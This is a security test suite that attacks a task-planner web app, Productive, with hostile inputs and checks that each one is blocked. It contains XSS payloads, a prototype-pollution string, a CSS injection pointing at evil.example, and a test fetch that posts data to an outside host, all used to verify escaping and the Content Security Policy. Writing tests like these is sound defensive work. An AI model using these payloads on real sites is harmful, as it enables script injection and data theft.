// Security test suite for Productive.
// Each test attacks the app the way a malicious page, link or hand-edited
// browser storage could, and checks the attack is blocked.
// Run with: npm test
const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const h = require('./helpers');

const XSS_IMG = '<img src=x onerror="window.__pwned=1">';
const XSS_SCRIPT = '<script>window.__pwned=1</script>';

let server, base, browser;
before(async () => {
  ({ server, base } = await h.startServer());
  browser = await h.launch();
});
after(async () => {
  await browser.close();
  server.close();
});

// Adds a task through the real form and returns the page.
async function addTaskThroughForm(fields) {
  const page = await h.openWithStorage(browser, base, {});
  await page.click('#newTaskBtn');
  await page.fill('#fTitle', fields.title || 'Task');
  if (fields.notes) await page.fill('#fNotes', fields.notes);
  if (fields.location) await page.fill('#fLocation', fields.location);
  await page.click('#saveBtn');
  await page.waitForSelector('#board .card');
  return page;
}

const pwned = (page) => page.evaluate(() => window.__pwned === 1);

describe('Script injection through the task form', () => {
  it('shows HTML typed into the title as plain text', async () => {
    const page = await addTaskThroughForm({ title: XSS_IMG });
    assert.equal(await page.textContent('#board .card h4'), XSS_IMG);
    assert.equal(await page.locator('#board img').count(), 0);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('does not run a script tag typed into the title', async () => {
    const page = await addTaskThroughForm({ title: XSS_SCRIPT });
    assert.equal(await page.locator('#board script').count(), 0);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('shows HTML typed into the notes as plain text', async () => {
    const page = await addTaskThroughForm({ title: 'Notes test', notes: XSS_IMG });
    assert.equal(await page.textContent('#board .card .notes'), XSS_IMG);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('shows HTML typed into the location as plain text', async () => {
    const page = await addTaskThroughForm({ title: 'Location test', location: XSS_IMG });
    assert.equal((await page.textContent('#board .card .meta a')).trim(), XSS_IMG);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('only ever links a location to a Google Maps search', async () => {
    const page = await addTaskThroughForm({ title: 'Link test', location: 'javascript:window.__pwned=1' });
    const href = await page.getAttribute('#board .card .meta a', 'href');
    assert.ok(href.startsWith('https://www.google.com/maps/search/?api=1&query='), href);
    await page.context().close();
  });
});

describe('Tampered browser storage', () => {
  it('escapes HTML in a saved task title', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ title: XSS_IMG })] } }));
    assert.equal(await page.textContent('#board .card h4'), XSS_IMG);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('escapes HTML in a saved category name', async () => {
    const page = await h.openWithState(browser, base, h.state({ categories: [{ id: 'work', name: XSS_IMG, color: '#FF4D4F' }] }));
    assert.equal(await page.locator('#board img, #filters img').count(), 0);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('replaces a task id containing HTML with a safe id', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ id: '"><img src=x onerror=window.__pwned=1>' })] } }));
    const [t] = await h.savedTasks(page);
    assert.match(t.id, /^[A-Za-z0-9_-]{1,64}$/);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('drops a category whose id contains HTML', async () => {
    const page = await h.openWithState(browser, base, h.state({
      categories: [{ id: 'work', name: 'Work', color: '#FF4D4F' }, { id: '<b>bad</b>', name: 'Bad', color: '#000000' }],
    }));
    const ids = (await h.saved(page)).categories.map((c) => c.id);
    assert.deepEqual(ids, ['work']);
    await page.context().close();
  });

  it('replaces a category color that is not a hex color', async () => {
    const page = await h.openWithState(browser, base, h.state({
      categories: [{ id: 'work', name: 'Work', color: 'red;background:url(https://evil.example)' }],
    }));
    assert.equal((await h.saved(page)).categories[0].color, '#8D92A1');
    await page.context().close();
  });

  it('does not let a __proto__ key pollute JavaScript objects', async () => {
    const raw = `{"version":1,"activeWeek":"${h.thisWeekKey()}","categories":[{"id":"work","name":"Work","color":"#FF4D4F"}],`
      + `"weeks":{"${h.thisWeekKey()}":[{"id":"t1","title":"x","day":6,"__proto__":{"polluted":true}}]},"routines":[],"__proto__":{"polluted":true}}`;
    const page = await h.openWithStorage(browser, base, { [h.STORE_KEY]: raw });
    assert.equal(await page.evaluate(() => ({}).polluted), undefined);
    assert.deepEqual(Object.keys((await h.saved(page))), ['version', 'activeWeek', 'categories', 'weeks', 'routines']);
    await page.context().close();
  });

  it('removes unknown top-level fields', async () => {
    const page = await h.openWithState(browser, base, h.state({ injected: '<script>', admin: true }));
    const s = await h.saved(page);
    assert.equal('injected' in s, false);
    assert.equal('admin' in s, false);
    await page.context().close();
  });

  it('resets an invalid task status to Create', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ status: 'hacked' })] } }));
    assert.equal((await h.savedTasks(page))[0].status, 'create');
    await page.context().close();
  });

  it('resets an invalid priority to 3', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ priority: 99 })] } }));
    assert.equal((await h.savedTasks(page))[0].priority, 3);
    await page.context().close();
  });

  it('clears an invalid time', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ time: '99:99' })] } }));
    assert.equal((await h.savedTasks(page))[0].time, '');
    await page.context().close();
  });

  it('drops a task with a day outside Sunday to Saturday', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task(), h.task({ id: 'bad', day: 9 })] } }));
    assert.deepEqual((await h.savedTasks(page)).map((t) => t.id), ['task1']);
    await page.context().close();
  });

  it('skips garbage rows instead of crashing', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [null, 42, 'text', [], h.task()] } }));
    assert.deepEqual((await h.savedTasks(page)).map((t) => t.id), ['task1']);
    assert.deepEqual(page.errors, []);
    await page.context().close();
  });

  it('gives duplicate task ids a new unique id', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task(), h.task({ title: 'Copy' })] } }));
    const ids = (await h.savedTasks(page)).map((t) => t.id);
    assert.equal(new Set(ids).size, 2);
    await page.context().close();
  });

  it('cuts an oversized title to 120 characters', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ title: 'A'.repeat(5000) })] } }));
    assert.equal((await h.savedTasks(page))[0].title.length, 120);
    await page.context().close();
  });

  it('cuts oversized notes to 2,000 characters', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ notes: 'B'.repeat(50000) })] } }));
    assert.equal((await h.savedTasks(page))[0].notes.length, 2000);
    await page.context().close();
  });

  it('strips hidden control characters from text', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ title: 'Clean\u0000\u0007\u001Btitle' })] } }));
    assert.equal((await h.savedTasks(page))[0].title, 'Cleantitle');
    await page.context().close();
  });

  it('only accepts a real true value for reminders', async () => {
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: [h.task({ time: '23:59', remind: 'true' })] } }));
    assert.equal('remind' in (await h.savedTasks(page))[0], false);
    await page.context().close();
  });

  it('caps a flooded week at 300 tasks', async () => {
    const flood = Array.from({ length: 450 }, (_, i) => h.task({ id: 'f' + i, title: 'Task ' + i }));
    const page = await h.openWithState(browser, base, h.state({ weeks: { [h.thisWeekKey()]: flood } }));
    assert.equal((await h.savedTasks(page)).length, 300);
    await page.context().close();
  });

  it('caps categories at 30', async () => {
    const cats = Array.from({ length: 80 }, (_, i) => ({ id: 'c' + i, name: 'Cat ' + i, color: '#123456' }));
    const page = await h.openWithState(browser, base, h.state({ categories: cats }));
    assert.equal((await h.saved(page)).categories.length, 30);
    await page.context().close();
  });

  it('starts fresh when saved data is not valid JSON', async () => {
    const page = await h.openWithStorage(browser, base, { [h.STORE_KEY]: '{not json<script>' });
    assert.equal(new URL(page.url()).pathname, '/index.html');
    assert.deepEqual((await h.saved(page)).weeks, {});
    await page.context().close();
  });

  it('saves the cleaned data straight away so tampered data does not stay behind', async () => {
    const page = await h.openWithState(browser, base, h.state({ evil: 1, weeks: { [h.thisWeekKey()]: [h.task({ priority: 0 })] } }));
    const s = await h.saved(page);
    assert.equal('evil' in s, false);
    assert.equal(s.weeks[h.thisWeekKey()][0].priority, 3);
    await page.context().close();
  });

  it('ignores unsafe values in saved display settings', async () => {
    const page = await h.openWithStorage(browser, base, {
      [h.STORE_KEY]: JSON.stringify(h.state()),
      [h.UI_KEY]: JSON.stringify({ filter: ['work', '"><img src=x onerror=window.__pwned=1>'], showPast: 'yes' }),
    });
    assert.equal(await page.locator('#filters img').count(), 0);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });
});

describe('Crafted links', () => {
  it('fills the contact form from a link as plain text, cut to 300 characters', async () => {
    const page = await h.openWithStorage(browser, base, {}, `/contact.html?topic=problem&page=${encodeURIComponent(XSS_IMG + 'x'.repeat(500))}`);
    const value = await page.inputValue('#cMessage');
    assert.ok(value.includes(XSS_IMG), value.slice(0, 80));
    assert.ok(value.length <= 'This link seems to be broken: '.length + 300);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });

  it('shows a tampered error log on the error page as plain text', async () => {
    const log = JSON.stringify([{ at: 'now', source: 'error', message: XSS_IMG, stack: XSS_SCRIPT, page: '/', browser: 'test' }]);
    const page = await h.openWithStorage(browser, base, { [h.ERROR_KEY]: log }, '/404.html?type=error');
    assert.ok((await page.textContent('#errorDetails')).includes(XSS_IMG));
    assert.equal(await page.locator('#errorDetails img').count(), 0);
    assert.equal(await pwned(page), false);
    await page.context().close();
  });
});

describe('Framing by another site', () => {
  it('shows only an "open in its own tab" link when loaded inside a frame', async () => {
    const context = await browser.newContext({ serviceWorkers: 'block' });
    const page = await context.newPage();
    await page.setContent(`<iframe src="${base}/index.html" width="900" height="600"></iframe>`);
    const frame = await (await page.waitForSelector('iframe')).contentFrame();
    await frame.waitForSelector('a[target="_top"]');
    assert.equal((await frame.textContent('body')).trim(), 'Open Productive in its own tab');
    assert.equal(await frame.locator('#board').count(), 0);
    await context.close();
  });
});

describe('Content Security Policy', () => {
  it('blocks the app from sending data to an outside server', async () => {
    const page = await h.openWithState(browser, base, h.state());
    const result = await page.evaluate(async () => {
      try { await fetch('https://example.com/collect', { method: 'POST', body: 'tasks' }); return 'sent'; } catch (_) { return 'blocked'; }
    });
    assert.equal(result, 'blocked');
    await page.context().close();
  });

  it('blocks injected inline scripts from running', async () => {
    const page = await h.openWithState(browser, base, h.state());
    const ran = await page.evaluate(async () => {
      const s = document.createElement('script');
      s.textContent = 'window.__inline = 1';
      document.body.appendChild(s);
      await new Promise((r) => setTimeout(r, 100));
      return window.__inline === 1;
    });
    assert.equal(ran, false);
    await page.context().close();
  });

  it('blocks scripts loaded from another site', async () => {
    const page = await h.openWithState(browser, base, h.state());
    const loaded = await page.evaluate(() => new Promise((resolve) => {
      const s = document.createElement('script');
      s.src = 'https://cdn.example.com/tracker.js';
      s.onload = () => resolve(true);
      s.onerror = () => resolve(false);
      document.body.appendChild(s);
    }));
    assert.equal(loaded, false);
    await page.context().close();
  });

  it('sets a strict policy on every page', () => {
    const pages = ['index.html', 'help.html', 'privacy.html', 'terms.html', 'contact.html', '404.html'];
    for (const file of pages) {
      const html = fs.readFileSync(path.join(h.ROOT, file), 'utf8');
      const csp = (html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || '';
      for (const rule of ["connect-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'"]) {
        assert.ok(csp.includes(rule), `${file} is missing ${rule}`);
      }
      assert.ok(!/script-src[^;]*'unsafe-inline'/.test(csp), `${file} allows inline scripts`);
    }
  });
});

describe('Input limits in the form', () => {
  it('limits title, location, notes and category name length in the form itself', async () => {
    const page = await h.openWithStorage(browser, base, {});
    const limits = await page.evaluate(() => ['#fTitle', '#fLocation', '#fNotes', '#newCatName'].map((s) => document.querySelector(s).maxLength));
    assert.deepEqual(limits, [120, 160, 2000, 30]);
    await page.context().close();
  });
});
